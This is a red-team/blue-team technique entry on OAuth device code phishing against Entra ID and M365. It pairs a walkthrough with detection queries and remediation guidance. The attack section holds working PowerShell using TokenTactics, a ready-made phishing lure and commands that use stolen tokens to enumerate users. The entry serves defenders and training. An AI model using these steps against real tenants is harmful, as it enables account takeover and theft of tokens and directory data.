# [IA-PHISH-001]: Device Code Phishing Attacks

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-001 |
| **MITRE ATT&CK v18.1** | [Phishing: Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID (Azure AD) / M365 |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique abuses the **OAuth 2.0 Device Authorization Grant** (RFC 8628). An attacker initiates an authentication flow for a legitimate Microsoft application (e.g., Microsoft Graph Command Line Tools) to generate a `user_code`. The victim is tricked into entering this code at `microsoft.com/devicelogin`.
- **Attack Surface:** The Microsoft identity platform's `/devicecode` endpoint. This flow is enabled by default for many first-party Microsoft applications and does not require the attacker to host a phishing page; the victim authenticates directly on the legitimate Microsoft portal.
- **Business Impact:** **Full Account Takeover (ATO)** with a valid Refresh Token (PRT equivalent). This often bypasses standard MFA because the session is initiated on the attacker's device, but the MFA challenge is satisfied by the victim on their trusted device.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** None (Public Client flow).
- **Vulnerable Config:**
    - Tenant allows the **Device Code Flow** (Default behavior).
    - Lack of **Conditional Access** policies restricting authentication flows or geographic locations.
- **Tools:**
    - [TokenTactics (v2)](https://github.com/rvrsh3ll/TokenTactics)
    - [GraphRunner](https://github.com/dafthack/GraphRunner)
    - [AadInternals](https://github.com/Guss/AADInternals)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Preparation (Generate User Code)**
The attacker requests a code for a high-value public client (e.g., Microsoft Office or Graph Command Line Tools `14d82eec-204b-4c2f-b7e8-296a70dab67e`).

```powershell
# Using TokenTactics to initiate the flow
Import-Module .\TokenTactics.psd1
# Target the 'Microsoft Graph Command Line Tools' App ID
Get-AzureToken -Client Graph
```
*Output will provide a `user_code` (e.g., `F8G9H2K`) and a verification URL.*

**Step 2: Exploitation (Social Engineering)**
Distribute the code via Email/Teams/Slack:
> "To enable the new hybrid meeting features, please authenticate your device at **microsoft.com/devicelogin** and enter code: **F8G9H2K**."

**Step 3: Persistence/Pivot**
Once the user authenticates, the script captures the tokens.

```powershell
# TokenTactics automatically saves the token
$AccessToken = $response.access_token
$RefreshToken = $response.refresh_token

# Verify access
Connect-AzureAD -AadAccessToken $AccessToken -AccountId $VictimEmail
# Or use raw REST API to dump users
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{Authorization = "Bearer $AccessToken"}
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Sign-in Logs
| Source | Attribute | Filter Logic |
|---|---|---|
| **SigninLogs** | `AuthenticationProtocol` | `DeviceCode` |
| **SigninLogs** | `ApplicationId` | `14d82eec-204b-4c2f-b7e8-296a70dab67e` (Graph Tools) OR `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Office) |
| **SigninLogs** | `RiskDetail` | `unexpectedTravel` or `anonymousIPAddress` |

#### 5.2 Microsoft Sentinel (KQL)
Detects successful Device Code authentication where the IP address is anomalous or not trusted.

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where AuthenticationProtocol == "DeviceCode"
| where ResultType == 0 // Successful login
// Filter out legitimate known dev usage if applicable
| extend ClientAppId = AppId
| project TimeGenerated, UserPrincipalName, IPAddress, Location, ClientAppId, UserAgent
| sort by TimeGenerated desc
```

#### 5.3 Splunk (SPL)
```spl
index=azure_ad sourcetype="azure:signin" authentication_protocol="DeviceCode" result_type=0
| stats count by user_principal_name, ip_address, app_display_name
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.1 Proactive Discovery (Hunting)
Audit the tenant to see if Device Code flow is commonly used.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "AuditLog.Read.All"
# Search for Device Code usage in last 30 days
Get-MgAuditLogSignIn -Filter "authenticationProtocol eq 'DeviceCode'" -All
```

#### 6.2 Immediate Remediation
*   **Conditional Access Policy:** Create a CA policy to **Block** the "Device Code Flow" for all users except specific developers/admins.
    *   *Users:* All Users (exclude Break Glass).
    *   *Cloud Apps:* All Cloud Apps.
    *   *Conditions:* **Client Apps** -> Select **"Other clients"** (This often covers device flow, though testing is required as it varies by client ID).
    *   *Grant:* Block Access.
*   **Phishing-Resistant MFA:** Enforce FIDO2/Windows Hello for Business. Simple push notifications are easily fatigued or bypassed via this method.

#### 6.3 Strategic Defense
*   **Application Governance:** Restrict which public clients can be used in the tenant.
*   **User Training:** Train users that they should *never* enter a code at `microsoft.com/devicelogin` unless *they* initiated the action themselves (e.g., setting up a CLI tool).

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-001] (Tenant Discovery - finding the target tenant)
> **Next Logical Step:** [REC-M365-001] (Graph API Enumeration using the stolen token)
